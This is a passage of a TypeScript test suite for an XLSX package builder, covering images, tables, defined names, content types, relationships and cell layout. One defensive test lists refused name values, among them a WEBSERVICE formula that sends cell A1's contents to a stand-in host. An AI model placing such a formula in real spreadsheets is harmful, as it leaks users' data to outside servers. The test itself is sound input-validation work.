    expect(chartSheet?.cells).toEqual(sourceChartSheet?.cells);
  });

  it("writes a real xl/drawings/drawingN.xml plus xl/media/imageN.png for a sheet image, and reading it back recovers the same bytes", () => {
    const document: ContentDocument = {
      kind: "spreadsheet",
      metadata: {},
      sheets: [
        {
          name: "Sheet1",
          cells: [],
          columns: [],
          rows: [],
          images: [
            {
              kind: "image",
              format: "png",
              base64: TINY_PNG_BASE64,
              widthPt: 100,
              heightPt: 50,
              anchorRow: 0,
              anchorColumn: 0,
              offsetXPt: 0,
              offsetYPt: 0,
            },
          ],
          printSettings: DEFAULT_PRINT_SETTINGS,
        },
      ],
    };
    const pkg = buildXlsxPackageFromContent(document);
    expect(Object.keys(pkg.parts)).toContain("xl/media/image1.png");
    const roundTripped = readXlsxContent(pkg);
    if (roundTripped.kind !== "spreadsheet") {
      throw new Error("expected a spreadsheet ContentDocument");
    }
    const image = roundTripped.sheets[0]?.images[0];
    expect(image?.format).toBe("png");
    expect(image?.base64).toBe(TINY_PNG_BASE64);
    expect(image?.widthPt).toBeCloseTo(100, 5);
    expect(image?.heightPt).toBeCloseTo(50, 5);
  });

  it("writes no drawing part, no worksheet rels, and no Content_Types override at all for a sheet carrying neither an image nor a chart", () => {
    const pkg = buildXlsxPackageFromContent(singleSheetDocument([]));
    expect(Object.keys(pkg.parts)).not.toContain("xl/drawings/drawing1.xml");
    expect(Object.keys(pkg.parts)).not.toContain(
      "xl/worksheets/_rels/sheet1.xml.rels",
    );
  });
});

function tableDefinitions(): DefinitionsTable {
  return {
    "table:SalesTable": {
      kind: "table",
      name: "SalesTable",
      ref: "A1:B3",
      sheet: "Sheet1",
      columns: ["Item", "Amount"],
    },
  };
}

describe("buildXlsxPackageFromContent: the definitions option (Table objects) and the document's own names", () => {
  it("writes a real xl/tables/tableN.xml plus a worksheet tableParts entry for a table definitions entry, and reading it back through readWorkbookDefinitions recovers the same entry", () => {
    const pkg = buildXlsxPackageFromContent(singleSheetDocument([]), {
      definitions: tableDefinitions(),
    });
    expect(Object.keys(pkg.parts)).toContain("xl/tables/table1.xml");
    const worksheet = rootElement(pkg.parts["xl/worksheets/sheet1.xml"]);
    if (worksheet === undefined) {
      throw new Error("expected the worksheet part to have a root element");
    }
    const tableParts = childrenWithTag(worksheet, "tableParts")[0];
    if (tableParts === undefined) {
      throw new Error("expected the worksheet to carry a tableParts element");
    }
    expect(childrenWithTag(tableParts, "tablePart")).toHaveLength(1);

    expect(readWorkbookDefinitions(pkg)).toEqual(tableDefinitions());
  });

  it("writes a real general <definedName> for a names entry, and reading it back through the flat reader recovers the same entry verbatim", () => {
    const wide = singleSheetDocument([]);
    if (wide.kind !== "spreadsheet") {
      throw new Error("expected a spreadsheet ContentDocument");
    }
    wide.names = [{ name: "TaxRate", refersTo: "Sheet1!$B$1" }];
    const pkg = buildXlsxPackageFromContent(wide);
    const workbook = rootElement(pkg.parts["xl/workbook.xml"]);
    if (workbook === undefined) {
      throw new Error("expected xl/workbook.xml to have a root element");
    }
    const definedNames = childrenWithTag(workbook, "definedNames")[0];
    if (definedNames === undefined) {
      throw new Error("expected a <definedNames> container");
    }
    const definedName = childrenWithTag(definedNames, "definedName").find(
      (element) => attr(element, "name") === "TaxRate",
    );
    expect(definedName).toBeDefined();
    if (definedName !== undefined) {
      expect(textContent(definedName)).toBe("Sheet1!$B$1");
    }

    const reread = readXlsxContent(pkg);
    if (reread.kind !== "spreadsheet") {
      throw new Error("expected a spreadsheet ContentDocument");
    }
    expect(reread.names).toEqual([
      { name: "TaxRate", refersTo: "Sheet1!$B$1" },
    ]);
  });

  it("writes scopeSheetIndex back as localSheetId, recovering the same sheet-scoped name", () => {
    const wide = singleSheetDocument([]);
    if (wide.kind !== "spreadsheet") {
      throw new Error("expected a spreadsheet ContentDocument");
    }
    wide.names = [
      { name: "ReportTitle", refersTo: "Sheet1!$A$1", scopeSheetIndex: 0 },
    ];
    const reread = readXlsxContent(buildXlsxPackageFromContent(wide));
    if (reread.kind !== "spreadsheet") {
      throw new Error("expected a spreadsheet ContentDocument");
    }
    expect(reread.names).toEqual([
      { name: "ReportTitle", refersTo: "Sheet1!$A$1", scopeSheetIndex: 0 },
    ]);
  });

  it("writes sheet-quoted ranges, unions, column ranges, and row ranges as names, and recovers each through the flat reader", () => {
    const names: ContentDefinedName[] = [
      { name: "Quoted", refersTo: "'Q1 Summary'!$A$1:$C$3" },
      { name: "Union", refersTo: "Sheet1!$A$1:$A$9,Sheet1!$C$1:$C$9" },
      { name: "Columns", refersTo: "Sheet1!$A:$C" },
      { name: "Rows", refersTo: "Sheet1!$1:$3" },
    ];
    const wide = singleSheetDocument([]);
    if (wide.kind !== "spreadsheet") {
      throw new Error("expected a spreadsheet ContentDocument");
    }
    wide.names = names;
    const reread = readXlsxContent(buildXlsxPackageFromContent(wide));
    if (reread.kind !== "spreadsheet") {
      throw new Error("expected a spreadsheet ContentDocument");
    }
    expect(reread.names).toEqual(names);
  });

  it("refuses a name whose refersTo carries formula or external-reference content, by name", () => {
    const refused: readonly string[] = [
      'Sheet1!$A$1&WEBSERVICE("http://example.invalid/"&A1)',
      "SUM(Sheet1!$A$1:$A$9)",
      "[1]Sheet1!$A$1",
      "Sheet1!$A$1:INDEX($A:$A,9)",
      "$A$1:$B$2",
      "=Sheet1!$A$1",
      "#REF!",
    ];
    for (const refersTo of refused) {
      const wide = singleSheetDocument([]);
      if (wide.kind !== "spreadsheet") {
        throw new Error("expected a spreadsheet ContentDocument");
      }
      wide.names = [{ name: "Danger", refersTo }];
      expect(() => buildXlsxPackageFromContent(wide)).toThrow(
        /sheet-qualified internal A1 reference/,
      );
    }
  });

  it("writes a names entry's own print built-in VERBATIM, deriving one from print settings only when the array does not already carry it", () => {
    const wide = singleSheetDocument([]);
    if (wide.kind !== "spreadsheet") {
      throw new Error("expected a spreadsheet ContentDocument");
    }
    const sheet = wide.sheets[0];
    if (sheet === undefined) {
      throw new Error("expected a sheet at index 0");
    }
    sheet.printSettings = {
      ...sheet.printSettings,
      printRange: { startRow: 0, startColumn: 0, endRow: 9, endColumn: 1 },
    };
    wide.names = [
      // The names array's own refersTo is the higher-fidelity spelling -- the derived Print_Area for sheet 0 must not duplicate or replace it.
      {
        name: "_xlnm.Print_Area",
        refersTo: "Sheet1!$A$1:$B$10,Sheet1!$D$1:$E$5",
        scopeSheetIndex: 0,
      },
      { name: "TaxRate", refersTo: "Sheet1!$B$1" },
    ];
    const pkg = buildXlsxPackageFromContent(wide);
    const workbook = rootElement(pkg.parts["xl/workbook.xml"]);
    if (workbook === undefined) {
      throw new Error("expected xl/workbook.xml to have a root element");
    }
    const definedNames = childrenWithTag(workbook, "definedNames")[0];
    if (definedNames === undefined) {
      throw new Error("expected a <definedNames> container");
    }
    const entries = childrenWithTag(definedNames, "definedName").map(
      (element) => ({
        name: attr(element, "name"),
        localSheetId: attr(element, "localSheetId"),
        refersTo: textContent(element),
      }),
    );
    expect(entries).toEqual([
      {
        name: "_xlnm.Print_Area",
        localSheetId: "0",
        refersTo: "Sheet1!$A$1:$B$10,Sheet1!$D$1:$E$5",
      },
      { name: "TaxRate", localSheetId: undefined, refersTo: "Sheet1!$B$1" },
    ]);
  });

  it("derives the reserved print names from structured print settings when the names array carries none", () => {
    const wide = singleSheetDocument([]);
    if (wide.kind !== "spreadsheet") {
      throw new Error("expected a spreadsheet ContentDocument");
    }
    const sheet = wide.sheets[0];
    if (sheet === undefined) {
      throw new Error("expected a sheet at index 0");
    }
    sheet.printSettings = {
      ...sheet.printSettings,
      printRange: { startRow: 0, startColumn: 0, endRow: 9, endColumn: 1 },
    };
    const pkg = buildXlsxPackageFromContent(wide);
    const workbook = rootElement(pkg.parts["xl/workbook.xml"]);
    if (workbook === undefined) {
      throw new Error("expected xl/workbook.xml to have a root element");
    }
    const definedNames = childrenWithTag(workbook, "definedNames")[0];
    if (definedNames === undefined) {
      throw new Error("expected a <definedNames> container");
    }
    const entries = childrenWithTag(definedNames, "definedName");
    expect(entries).toHaveLength(1);
    const printArea = entries[0];
    if (printArea === undefined) {
      throw new Error("expected a print-area definedName");
    }
    expect(attr(printArea, "name")).toBe("_xlnm.Print_Area");
    expect(attr(printArea, "localSheetId")).toBe("0");
    expect(textContent(printArea)).toBe("Sheet1!$A$1:$B$10");
  });

  it("writes no <definedNames> container and no xl/tables part at all when no definitions are supplied and the document carries no names", () => {
    const pkg = buildXlsxPackageFromContent(singleSheetDocument([]));
    const workbook = rootElement(pkg.parts["xl/workbook.xml"]);
    if (workbook === undefined) {
      throw new Error("expected xl/workbook.xml to have a root element");
    }
    expect(childrenWithTag(workbook, "definedNames")).toHaveLength(0);
    expect(Object.keys(pkg.parts)).not.toContain("xl/tables/table1.xml");
  });
});

// --- exact scaffolding: the XML declaration, [Content_Types].xml, package/workbook relationships -----------------

describe("buildXlsxPackageFromContent: every XML part carries the same declaration prolog", () => {
  it('declares version="1.0" encoding="UTF-8" standalone="yes" on the [Content_Types].xml part', () => {
    const part = buildXlsxPackageFromContent(singleSheetDocument([])).parts[
      "[Content_Types].xml"
    ];
    if (part?.kind !== "xml") {
      throw new Error("expected an xml part");
    }
    const declaration = part.nodes[0];
    if (declaration?.type !== "declaration") {
      throw new Error("expected a declaration node first");
    }
    const attrOf = (name: string): string | undefined =>
      declaration.attributes.find((a) => a.name === name)?.value;
    expect(attrOf("version")).toBe("1.0");
    expect(attrOf("encoding")).toBe("UTF-8");
    expect(attrOf("standalone")).toBe("yes");
  });
});

describe("buildXlsxPackageFromContent: [Content_Types].xml carries every part's exact Override, for a document exercising every content kind", () => {
  function fullDocument(): ContentDocument {
    const chart = chartEmbeddedObject();
    return {
      kind: "spreadsheet",
      metadata: {},
      sheets: [
        {
          name: "Sheet1",
          cells: [
            {
              row: 0,
              column: 0,
              value: { kind: "string", value: "x" },
              displayText: "x",
              comment: { text: "note" },
            },
          ],
          columns: [],
          rows: [],
          images: [
            {
              kind: "image",
              format: "png",
              base64: TINY_PNG_BASE64,
              widthPt: 10,
              heightPt: 10,
              anchorRow: 0,
              anchorColumn: 0,
              offsetXPt: 0,
              offsetYPt: 0,
            },
          ],
          embeddedObjects: [chart],
          printSettings: DEFAULT_PRINT_SETTINGS,
        },
        {
          name: "Sheet2",
          cells: [],
          columns: [],
          rows: [],
          images: [],
          printSettings: DEFAULT_PRINT_SETTINGS,
        },
      ],
    };
  }

  it("writes the fixed workbook/styles/sharedStrings overrides, one worksheet override per sheet, and the media/comments/drawing/chart/table overrides for the parts a fuller document actually carries", () => {
    const pkg = buildXlsxPackageFromContent(fullDocument(), {
      definitions: tableDefinitions(),
    });
    const contentTypes = rootElement(pkg.parts["[Content_Types].xml"]);
    if (contentTypes === undefined) {
      throw new Error("expected [Content_Types].xml to have a root element");
    }
    const defaults = childrenWithTag(contentTypes, "Default").map((el) => ({
      extension: attr(el, "Extension"),
      contentType: attr(el, "ContentType"),
    }));
    expect(defaults).toContainEqual({
      extension: "rels",
      contentType: "application/vnd.openxmlformats-package.relationships+xml",
    });
    expect(defaults).toContainEqual({
      extension: "xml",
      contentType: "application/xml",
    });
    expect(defaults).toContainEqual({
      extension: "png",
      contentType: "image/png",
    });

    const overrides = childrenWithTag(contentTypes, "Override").map((el) => ({
      partName: attr(el, "PartName"),
      contentType: attr(el, "ContentType"),
    }));
    expect(overrides).toContainEqual({
      partName: "/xl/workbook.xml",
      contentType:
        "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml",
    });
    expect(overrides).toContainEqual({
      partName: "/xl/styles.xml",
      contentType:
        "application/vnd.openxmlformats-officedocument.spreadsheetml.styles+xml",
    });
    expect(overrides).toContainEqual({
      partName: "/xl/sharedStrings.xml",
      contentType:
        "application/vnd.openxmlformats-officedocument.spreadsheetml.sharedStrings+xml",
    });
    // One worksheet override per sheet, not one fewer or one more.
    expect(overrides).toContainEqual({
      partName: "/xl/worksheets/sheet1.xml",
      contentType:
        "application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml",
    });
    expect(overrides).toContainEqual({
      partName: "/xl/worksheets/sheet2.xml",
      contentType:
        "application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml",
    });
    expect(
      overrides.filter((o) => o.partName?.startsWith("/xl/worksheets/sheet")),
    ).toHaveLength(2);
    // Only sheet 1 carries a comment, a drawing, and a table -- indices must not leak onto sheet 2.
    expect(overrides).toContainEqual({
      partName: "/xl/threadedComments/threadedComment1.xml",
      contentType: "application/vnd.ms-excel.threadedcomments+xml",
    });
    expect(overrides).not.toContainEqual(
      expect.objectContaining({
        partName: "/xl/threadedComments/threadedComment2.xml",
      }),
    );
    expect(overrides).toContainEqual({
      partName: "/xl/drawings/drawing1.xml",
      contentType: "application/vnd.openxmlformats-officedocument.drawing+xml",
    });
    expect(overrides).not.toContainEqual(
      expect.objectContaining({ partName: "/xl/drawings/drawing2.xml" }),
    );
    expect(overrides).toContainEqual({
      partName: "/xl/charts/chart1.xml",
      contentType:
        "application/vnd.openxmlformats-officedocument.drawingml.chart+xml",
    });
    expect(overrides).toContainEqual({
      partName: "/xl/tables/table1.xml",
      contentType:
        "application/vnd.openxmlformats-officedocument.spreadsheetml.table+xml",
    });
    expect(overrides).toContainEqual({
      partName: "/docProps/core.xml",
      contentType: "application/vnd.openxmlformats-package.core-properties+xml",
    });
    expect(overrides).toContainEqual({
      partName: "/docProps/app.xml",
      contentType:
        "application/vnd.openxmlformats-officedocument.extended-properties+xml",
    });
  });

  it("declares no jpeg/gif media default when only a png is actually used", () => {
    const pkg = buildXlsxPackageFromContent(fullDocument());
    const contentTypes = rootElement(pkg.parts["[Content_Types].xml"]);
    if (contentTypes === undefined) {
      throw new Error("expected [Content_Types].xml to have a root element");
    }
    const extensions = childrenWithTag(contentTypes, "Default").map((el) =>
      attr(el, "Extension"),
    );
    expect(extensions).not.toContain("jpeg");
    expect(extensions).not.toContain("gif");
  });
});

describe("buildXlsxPackageFromContent: _rels/.rels carries exactly the three fixed package relationships", () => {
  it("writes rId1/rId2/rId3 pointing at the workbook, core properties, and extended properties, in that order", () => {
    const pkg = buildXlsxPackageFromContent(singleSheetDocument([]));
    const rels = rootElement(pkg.parts["_rels/.rels"]);
    if (rels === undefined) {
      throw new Error("expected _rels/.rels to have a root element");
    }
    const relationships = childrenWithTag(rels, "Relationship").map((el) => ({
      id: attr(el, "Id"),
      type: attr(el, "Type"),
      target: attr(el, "Target"),
    }));
    expect(relationships).toEqual([
      {
        id: "rId1",
        type: "http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument",
        target: "xl/workbook.xml",
      },
      {
        id: "rId2",
        type: "http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties",
        target: "docProps/core.xml",
      },
      {
        id: "rId3",
        type: "http://schemas.openxmlformats.org/officeDocument/2006/relationships/extended-properties",
        target: "docProps/app.xml",
      },
    ]);
  });
});

describe("buildXlsxPackageFromContent: xl/_rels/workbook.xml.rels numbers worksheet relationships before styles/sharedStrings, exactly one id past the sheet count", () => {
  it("writes one worksheet relationship per sheet (rId1..rIdN), then styles at rId(N+1) and sharedStrings at rId(N+2), for a 2-sheet workbook", () => {
    const pkg = buildXlsxPackageFromContent(DOCUMENT);
    const rels = rootElement(pkg.parts["xl/_rels/workbook.xml.rels"]);
    if (rels === undefined) {
      throw new Error(
        "expected xl/_rels/workbook.xml.rels to have a root element",
      );
    }
    const relationships = childrenWithTag(rels, "Relationship").map((el) => ({
      id: attr(el, "Id"),
      type: attr(el, "Type"),
      target: attr(el, "Target"),
    }));
    expect(relationships).toEqual([
      {
        id: "rId1",
        type: "http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet",
        target: "worksheets/sheet1.xml",
      },
      {
        id: "rId2",
        type: "http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet",
        target: "worksheets/sheet2.xml",
      },
      {
        id: "rId3",
        type: "http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles",
        target: "styles.xml",
      },
      {
        id: "rId4",
        type: "http://schemas.openxmlformats.org/officeDocument/2006/relationships/sharedStrings",
        target: "sharedStrings.xml",
      },
    ]);
  });

  it("writes exactly one worksheet relationship, at rId1, for a single-sheet workbook -- proving the loop runs sheetCount times, not one more or fewer", () => {
    const pkg = buildXlsxPackageFromContent(singleSheetDocument([]));
    const rels = rootElement(pkg.parts["xl/_rels/workbook.xml.rels"]);
    if (rels === undefined) {
      throw new Error(
        "expected xl/_rels/workbook.xml.rels to have a root element",
      );
    }
    const worksheetRels = childrenWithTag(rels, "Relationship").filter(
      (el) =>
        attr(el, "Type") ===
        "http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet",
    );
    expect(worksheetRels).toHaveLength(1);
    const [worksheetRel] = worksheetRels;
    if (worksheetRel === undefined) {
      throw new Error("expected exactly one worksheet relationship");
    }
    expect(attr(worksheetRel, "Id")).toBe("rId1");
  });
});

describe("buildXlsxPackageFromContent: xl/workbook.xml sheet elements carry the correct sheetId and r:id per index", () => {
  it("numbers sheetId from 1 and r:id via worksheetRelId, matching the sheet's own position, for a 2-sheet workbook", () => {
    const pkg = buildXlsxPackageFromContent(DOCUMENT);
    const workbook = rootElement(pkg.parts["xl/workbook.xml"]);
    if (workbook === undefined) {
      throw new Error("expected xl/workbook.xml to have a root element");
    }
    expect(attr(workbook, "xmlns:r")).toBe(
      "http://schemas.openxmlformats.org/officeDocument/2006/relationships",
    );
    const sheetsEl = requireChild(workbook, "sheets");
    const sheetElements = elementsOf(sheetsEl, "sheet").map((el) => ({
      name: attributeOf(el, "name"),
      sheetId: attributeOf(el, "sheetId"),
      rId: attributeOf(el, "r:id"),
    }));
    expect(sheetElements).toEqual([
      { name: "Data", sheetId: "1", rId: "rId1" },
      { name: "Summary", sheetId: "2", rId: "rId2" },
    ]);
  });
});

describe("buildXlsxPackageFromContent: derives _xlnm.Print_Titles from EITHER repeatRows or repeatColumns alone, not only when both are present", () => {
  function documentWithRepeat(
    repeat: Partial<
      Pick<ContentSheet["printSettings"], "repeatRows" | "repeatColumns">
    >,
  ): ContentDocument {
    return {
      kind: "spreadsheet",
      metadata: {},
      sheets: [
        {
          name: "Sheet1",
          cells: [],
          columns: [],
          rows: [],
          images: [],
          printSettings: { ...DEFAULT_PRINT_SETTINGS, ...repeat },
        },
      ],
    };
  }

  it("derives Print_Titles from repeatRows alone, with no repeatColumns set", () => {
    const pkg = buildXlsxPackageFromContent(
      documentWithRepeat({ repeatRows: { start: 0, end: 1 } }),
    );
    const workbook = rootElement(pkg.parts["xl/workbook.xml"]);
    if (workbook === undefined) {
      throw new Error("expected xl/workbook.xml to have a root element");
    }
    const definedNames = requireChild(workbook, "definedNames");
    const printTitles = elementsOf(definedNames, "definedName").find(
      (el) => attributeOf(el, "name") === "_xlnm.Print_Titles",
    );
    expect(printTitles).toBeDefined();
  });

  it("derives Print_Titles from repeatColumns alone, with no repeatRows set", () => {
    const pkg = buildXlsxPackageFromContent(
      documentWithRepeat({ repeatColumns: { start: 0, end: 1 } }),
    );
    const workbook = rootElement(pkg.parts["xl/workbook.xml"]);
    if (workbook === undefined) {
      throw new Error("expected xl/workbook.xml to have a root element");
    }
    const definedNames = requireChild(workbook, "definedNames");
    const printTitles = elementsOf(definedNames, "definedName").find(
      (el) => attributeOf(el, "name") === "_xlnm.Print_Titles",
    );
    expect(printTitles).toBeDefined();
  });

  it("derives no Print_Titles at all when neither repeatRows nor repeatColumns is set", () => {
    const pkg = buildXlsxPackageFromContent(documentWithRepeat({}));
    const workbook = rootElement(pkg.parts["xl/workbook.xml"]);
    if (workbook === undefined) {
      throw new Error("expected xl/workbook.xml to have a root element");
    }
    expect(childrenWithTag(workbook, "definedNames")).toHaveLength(0);
  });

  it("does not duplicate Print_Titles when the names array already carries it verbatim for that sheet", () => {
    const wide = documentWithRepeat({ repeatRows: { start: 0, end: 1 } });
    if (wide.kind !== "spreadsheet") {
      throw new Error("expected a spreadsheet ContentDocument");
    }
    wide.names = [
      {
        name: "_xlnm.Print_Titles",
        refersTo: "Sheet1!$1:$1",
        scopeSheetIndex: 0,
      },
    ];
    const pkg = buildXlsxPackageFromContent(wide);
    const workbook = rootElement(pkg.parts["xl/workbook.xml"]);
    if (workbook === undefined) {
      throw new Error("expected xl/workbook.xml to have a root element");
    }
    const definedNames = requireChild(workbook, "definedNames");
    const printTitlesEntries = elementsOf(definedNames, "definedName").filter(
      (el) => attributeOf(el, "name") === "_xlnm.Print_Titles",
    );
    expect(printTitlesEntries).toHaveLength(1);
    expect(textContent(printTitlesEntries[0]!)).toBe("Sheet1!$1:$1");
  });
});

describe("buildXlsxPackageFromContent: xl/sharedStrings.xml carries the exact count/uniqueCount and per-entry xml:space", () => {
  it('writes count and uniqueCount equal to the number of distinct strings, and xml:space="preserve" on every <t>', () => {
    const pkg = buildXlsxPackageFromContent(
      singleSheetDocument([
        {
          row: 0,
          column: 0,
          value: { kind: "string", value: "Alpha" },
          displayText: "Alpha",
        },
        {
          row: 0,
          column: 1,
          value: { kind: "string", value: "Beta" },
          displayText: "Beta",
        },
      ]),
    );
    const sharedStrings = rootElement(pkg.parts["xl/sharedStrings.xml"]);
    if (sharedStrings === undefined) {
      throw new Error("expected xl/sharedStrings.xml to have a root element");
    }
    expect(attr(sharedStrings, "count")).toBe("2");
    expect(attr(sharedStrings, "uniqueCount")).toBe("2");
    const tElements = childrenWithTag(sharedStrings, "si").map(
      (si) => childrenWithTag(si, "t")[0],
    );
    for (const t of tElements) {
      expect(t === undefined ? undefined : attr(t, "xml:space")).toBe(
        "preserve",
      );
    }
    expect(textContent(childrenWithTag(sharedStrings, "si")[0]!)).toBe("Alpha");
  });
});

// --- computeDimension, buildColsElement, cell/row assembly ---------------------------------------------------------

describe("computeDimension: each of cells, columns, and rows independently extends the dimension, never overwriting a larger extent with a smaller one", () => {
  function sheetOf(
    overrides: Partial<Pick<ContentSheet, "cells" | "columns" | "rows">>,
  ): ContentDocument {
    return {
      kind: "spreadsheet",
      metadata: {},
      sheets: [
        {
          name: "Sheet1",
          cells: [],
          columns: [],
          rows: [],
          images: [],
          printSettings: DEFAULT_PRINT_SETTINGS,
          ...overrides,
        },
      ],
    };
  }

  function dimensionRefOf(pkg: Package): string | undefined {
    const worksheet = rootElement(pkg.parts["xl/worksheets/sheet1.xml"]);
    if (worksheet === undefined) {
      throw new Error("expected a worksheet root element");
    }
    return attr(requireChild(worksheet, "dimension"), "ref");
  }

  it("extends the dimension from columns alone, with no cells or rows, down to row 1 only", () => {
    const pkg = buildXlsxPackageFromContent(
      sheetOf({ columns: [{ index: 4 }] }),
    );
    expect(dimensionRefOf(pkg)).toBe("A1:E1");
  });

  it("extends the dimension from rows alone, with no cells or columns, out to column A only", () => {
    const pkg = buildXlsxPackageFromContent(sheetOf({ rows: [{ index: 4 }] }));
    expect(dimensionRefOf(pkg)).toBe("A1:A5");
  });

  it("takes the larger of cells' and rows'/columns' own extents, not the smaller -- a column/row entry past the last cell still widens the dimension", () => {
    const pkg = buildXlsxPackageFromContent(
      sheetOf({
        cells: [
          {
            row: 0,
            column: 0,
            value: { kind: "string", value: "x" },
            displayText: "x",
          },
        ],
        columns: [{ index: 9 }],
        rows: [{ index: 9 }],
      }),
    );
    expect(dimensionRefOf(pkg)).toBe("A1:J10");
  });
});

describe("buildColsElement: width and hidden are independent, either can be written alone", () => {
  it("writes a hidden column with no width attribute at all, when only `hidden` is declared", () => {
    const hiddenOnly = buildXlsxPackageFromContent({
      kind: "spreadsheet",
      metadata: {},
      sheets: [
        {
          name: "Sheet1",
          cells: [],
          columns: [{ index: 0, hidden: true }],
          rows: [],
          images: [],
          printSettings: DEFAULT_PRINT_SETTINGS,
        },
      ],
    });
    const worksheet = rootElement(hiddenOnly.parts["xl/worksheets/sheet1.xml"]);
    if (worksheet === undefined) {
      throw new Error("expected a worksheet root element");
    }
    const col = requireChild(requireChild(worksheet, "cols"), "col");
    expect(attr(col, "hidden")).toBe("true");
    expect(attr(col, "width")).toBeUndefined();
    expect(attr(col, "customWidth")).toBeUndefined();
    expect(attr(col, "min")).toBe("1");
    expect(attr(col, "max")).toBe("1");
  });

  it("writes a visible column with width/customWidth and no hidden attribute at all, when only `widthPt` is declared", () => {
    const widthOnly = buildXlsxPackageFromContent({
      kind: "spreadsheet",
      metadata: {},
      sheets: [
        {
          name: "Sheet1",
          cells: [],
          columns: [{ index: 2, widthPt: 80 }],
          rows: [],
          images: [],
          printSettings: DEFAULT_PRINT_SETTINGS,
        },
      ],
    });
    const worksheet = rootElement(widthOnly.parts["xl/worksheets/sheet1.xml"]);
    if (worksheet === undefined) {
      throw new Error("expected a worksheet root element");
    }
    const col = requireChild(requireChild(worksheet, "cols"), "col");
    expect(attr(col, "customWidth")).toBe("true");
    expect(attr(col, "hidden")).toBeUndefined();
    expect(attr(col, "min")).toBe("3");
    expect(attr(col, "max")).toBe("3");
  });
});

describe("buildSheetDataElement: rows and cells are written in ascending order regardless of input order, and a row with no ContentSheetRow entry carries only its own r attribute", () => {
  it("writes rows in ascending row-index order and, within a row, cells in ascending column order, even when supplied in reverse", () => {
    const pkg = buildXlsxPackageFromContent(
      singleSheetDocument([
        {
          row: 5,
          column: 2,
          value: { kind: "string", value: "e" },
          displayText: "e",
        },
        {
          row: 2,
          column: 0,
          value: { kind: "string", value: "b" },
          displayText: "b",
        },
        {
          row: 2,
          column: 3,
          value: { kind: "string", value: "d" },
          displayText: "d",
        },
        {
          row: 0,
          column: 1,
          value: { kind: "string", value: "a" },
          displayText: "a",
        },
      ]),
    );
    const worksheet = rootElement(pkg.parts["xl/worksheets/sheet1.xml"]);
    if (worksheet === undefined) {
      throw new Error("expected a worksheet root element");
    }
    const sheetData = requireChild(worksheet, "sheetData");
    const rows = elementsOf(sheetData, "row");
    expect(rows.map((row) => attr(row, "r"))).toEqual(["1", "3", "6"]);
    const middleRow = rows[1];
    if (middleRow === undefined) {
      throw new Error("expected the row at index 1 (row 3)");
    }
    expect(elementsOf(middleRow, "c").map((cell) => attr(cell, "r"))).toEqual([
      "A3",
      "D3",
    ]);
  });

  it("writes a row's own r attribute alone, with no ht/customHeight/hidden, when the sheet declares no matching ContentSheetRow", () => {
    const pkg = buildXlsxPackageFromContent(
      singleSheetDocument([
        {
          row: 3,
          column: 0,
          value: { kind: "string", value: "x" },
          displayText: "x",
        },
      ]),
    );
    const worksheet = rootElement(pkg.parts["xl/worksheets/sheet1.xml"]);
    if (worksheet === undefined) {
      throw new Error("expected a worksheet root element");
    }
    const row = requireChild(requireChild(worksheet, "sheetData"), "row");
    expect(attr(row, "r")).toBe("4");
    expect(attr(row, "ht")).toBeUndefined();
    expect(attr(row, "customHeight")).toBeUndefined();
    expect(attr(row, "hidden")).toBeUndefined();
  });
});

describe("buildMergeCellsElement: colSpan and rowSpan trigger a merge independently of each other", () => {
  function pkgWith(cells: ContentSheet["cells"]): Package {
    return buildXlsxPackageFromContent(singleSheetDocument(cells));
  }

  it("treats colSpan alone (rowSpan defaulting to 1) as a merge", () => {
    const pkg = pkgWith([
      {
        row: 0,
        column: 0,
        value: { kind: "string", value: "x" },
        displayText: "x",
        colSpan: 3,
      },
    ]);
    const worksheet = rootElement(pkg.parts["xl/worksheets/sheet1.xml"]);
    if (worksheet === undefined) {
      throw new Error("expected a worksheet root element");
    }
    const mergeCells = requireChild(worksheet, "mergeCells");
    expect(attr(mergeCells, "count")).toBe("1");
    const mergeCell = requireChild(mergeCells, "mergeCell");
    expect(attr(mergeCell, "ref")).toBe("A1:C1");
  });

  it("treats rowSpan alone (colSpan defaulting to 1) as a merge", () => {
    const pkg = pkgWith([
      {
        row: 0,
        column: 0,
        value: { kind: "string", value: "x" },
        displayText: "x",
        rowSpan: 3,
      },
    ]);
    const worksheet = rootElement(pkg.parts["xl/worksheets/sheet1.xml"]);
    if (worksheet === undefined) {
      throw new Error("expected a worksheet root element");
    }
    const mergeCell = requireChild(
      requireChild(worksheet, "mergeCells"),
      "mergeCell",
    );
    expect(attr(mergeCell, "ref")).toBe("A1:A3");
  });

  it("writes no <mergeCells> element at all when every cell's colSpan/rowSpan is exactly 1 or absent", () => {
    const pkg = pkgWith([
      {
        row: 0,
        column: 0,
        value: { kind: "string", value: "x" },
        displayText: "x",
        colSpan: 1,
        rowSpan: 1,
      },
    ]);
    const worksheet = rootElement(pkg.parts["xl/worksheets/sheet1.xml"]);
    if (worksheet === undefined) {
      throw new Error("expected a worksheet root element");
    }
    expect(childrenWithTag(worksheet, "mergeCells")).toHaveLength(0);
  });
});

describe("buildCellElement: the decoration/format branches that decide styleIndex, and the exact t/f/v children written", () => {
  it("writes a cell carrying alignment alone (no font/background/borders/verticalAlignment) as decorated, not left at the default style index", () => {
    const pkg = buildXlsxPackageFromContent(
      singleSheetDocument([
        {
          row: 0,
          column: 0,
          value: { kind: "string", value: "left" },
          displayText: "left",
          alignment: "left",
        },
        {
          row: 0,
          column: 1,
          value: { kind: "string", value: "plain" },
          displayText: "plain",
        },
      ]),
    );
    const leftIndex = attr(writtenCell(pkg, "A1"), "s");
    const plainIndex = attr(writtenCell(pkg, "B1"), "s");
    expect(leftIndex).not.toBe(plainIndex);
    expect(plainIndex).toBe("0");
  });

  it("writes both <f> and <v> for a formula cell, in that order, and no t attribute for its numeric cached result", () => {
    const pkg = buildXlsxPackageFromContent(
      singleSheetDocument([
        {
          row: 0,
          column: 0,
          value: { kind: "number", value: 5 },
          formula: "2+3",
          displayText: "5",
        },
      ]),
    );
    const cell = writtenCell(pkg, "A1");
    expect(
      cell.children.map((c) => (c.type === "element" ? c.tag : c.type)),
    ).toEqual(["f", "v"]);
    expect(textContent(requireChild(cell, "f"))).toBe("2+3");
    expect(attr(cell, "t")).toBeUndefined();
  });

